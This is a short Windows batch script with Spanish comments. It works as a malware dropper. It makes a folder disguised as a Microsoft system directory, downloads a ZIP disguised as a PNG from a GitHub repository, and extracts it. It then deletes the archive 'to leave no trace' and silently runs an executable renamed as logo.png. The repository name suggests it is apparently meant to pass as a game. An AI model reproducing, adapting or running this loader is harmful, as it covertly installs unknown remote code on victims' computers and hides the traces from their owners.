@echo off
:: Carpeta discreta donde se guardará todo
set "targetDir=%LocalAppData%\Microsoft\Windows\CloudExperienceHost"
if not exist "%targetDir%" mkdir "%targetDir%"

:: Tu link de GitHub (asegúrate que sea exactamente así)
set "baseUrl=https://raw.githubusercontent.com/deuzinnuse-collab/juego/main"

:: 1. Descarga el ZIP con contraseña (disfrazado de .png)
powershell -Command "iwr '%baseUrl%/datos.png' -OutFile '%targetDir%\datos.zip'"

:: 2. Lo descomprime (Aquí es donde ocurre la magia)
powershell -Command "$shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%targetDir%\datos.zip'); $dest = $shell.NameSpace('%targetDir%'); $dest.CopyHere($zip.Items())"

:: 3. Borra el ZIP para no dejar rastro
del /q "%targetDir%\datos.zip"

:: 4. Ejecuta el archivo (Asegúrate que se llame logo.png o cámbialo aquí al nombre que tenga el exe dentro del ZIP)
start /b "" "%targetDir%\logo.png"
exit
